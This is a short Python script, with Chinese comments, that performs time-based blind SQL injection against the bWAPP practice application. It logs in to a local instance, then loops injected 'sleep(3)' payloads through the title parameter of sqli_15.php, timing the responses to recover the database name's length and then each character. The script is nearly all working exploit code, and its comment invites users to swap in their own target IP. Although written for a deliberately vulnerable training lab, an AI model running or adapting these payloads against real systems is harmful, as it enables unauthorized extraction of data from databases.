'''
bwapp sqli 时间盲注 将ip改为自己ip即可
'''
import requests
import time

ip_port = '192.168.43.94:80'
data = {
    'login' : 'aideyisu',
    'password' : 'aideyisu',
    'security_level' : '0',
    'form' : 'submit'
}

url_login = f'http://{ip_port}/login.php'
session = requests.session()
resp = session.post(url_login, data)
num = 0

# 获取数据库长度名称`
for i in range(1, 21) :
    url = "http://%s/sqli_15.php?title=World War Z' and length(database())=%d and sleep(3) -- &action=search"%(ip_port, i)
    start_time = time.time()
    resp =session.get(url)
    end_time = time.time()
    if  end_time - start_time > 1 :
        print(f'length of database name is {i} \n{start_time} \n{end_time}\n')
        num = i
        break

result = []
# 获取数据库名字    
for j in range(1, num + 1) :
    for k in range(33, 128) :
        url = "http://%s/sqli_15.php?title=World War Z' and ascii(substr(database(),%d,1))=%d and sleep(3) -- &action=search"%(ip_port, j, k)
        start_time = time.time()
        resp =session.get(url)
        end_time = time.time()
        if  end_time - start_time > 1 :
            print(chr(k))
            result.append(chr(k))
            break

print(result)



